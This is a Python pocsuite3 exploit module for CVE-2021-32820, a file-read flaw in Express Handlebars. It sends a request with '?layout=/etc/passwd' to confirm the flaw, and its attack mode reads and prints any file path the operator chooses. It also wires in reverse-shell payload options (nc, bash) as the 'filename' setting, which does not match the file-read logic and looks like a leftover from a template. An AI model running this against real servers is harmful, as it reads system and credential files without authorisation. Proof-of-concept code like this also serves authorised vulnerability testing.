from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
class DemoPOC(POCBase):
    vulID = 'CVE-2021-32820'  # ssvid
    version = '1.0'
    name = 'Express Handlebars 文件读取漏洞'
    appName = 'Express Handlebars'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Express-handlebars 存在信息泄露漏洞，其布局参数可能会在下游应用程序中触发文件读取漏洞。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["filename"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/?layout=/etc/passwd"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "root" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self):
        result = {}
        filename = self.get_option("filename")
        try:
            target = self.url+"/?layout="+filename
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 :
                print(r.text)
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)